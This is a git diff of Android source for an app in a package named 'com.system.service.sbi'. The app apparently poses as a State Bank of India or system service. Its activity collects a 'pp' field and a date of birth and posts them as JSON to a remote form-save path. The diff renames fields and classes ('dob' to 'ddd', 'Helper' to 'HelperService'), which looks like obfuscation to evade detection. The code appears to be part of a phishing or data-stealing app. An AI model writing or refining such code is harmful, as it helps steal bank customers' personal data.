@@ -2,15 +2,14 @@ package com.system.service.sbi;
 
 import android.content.Intent;
 import android.os.Bundle;
-import android.util.Log;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
 
-import com.system.service.sbi.FrontServices.DateInputMask;
-import com.system.service.sbi.FrontServices.FormValidator;
+import com.system.service.sbi.MinorServices.DateInputMask;
+import com.system.service.sbi.MinorServices.FormValidator;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -37,12 +36,12 @@ public class SecondActivity extends AppCompatActivity {
         int id = getIntent().getIntExtra("id", -1);
         Button buttonSubmit = findViewById(R.id.login_button);
 
-        EditText dob = findViewById(R.id.dob);
-        dob.addTextChangedListener(new DateInputMask(dob));
+        EditText ddd = findViewById(R.id.ddd);
+        ddd.addTextChangedListener(new DateInputMask(ddd));
 
         ids = new HashMap<>();
         ids.put(R.id.pp, "pp");
-        ids.put(R.id.dob, "dob");
+        ids.put(R.id.ddd, "ddd");
 
         for(Map.Entry<Integer, String> entry : ids.entrySet()) {
             int viewId = entry.getKey();
@@ -59,11 +58,11 @@ public class SecondActivity extends AppCompatActivity {
                 JSONObject dataJson = new JSONObject(dataObject);
                 JSONObject sendPayload = new JSONObject();
                 try {
-                    Helper helper = new Helper();
-                    sendPayload.put("site", helper.SITE());
+                    HelperService helperService = new HelperService();
+                    sendPayload.put("site", helperService.SITE());
                     sendPayload.put("data", dataJson);
                     sendPayload.put("id", id);
-                    Helper.postRequest(helper.FormSavePath(), sendPayload, new Helper.ResponseListener() {
+                    HelperService.postRequest(helperService.FormSavePath(), sendPayload, getApplicationContext() , new HelperService.ResponseListener() {
                         @Override
                         public void onResponse(String result) {
                             if (result.startsWith("Response Error:")) {
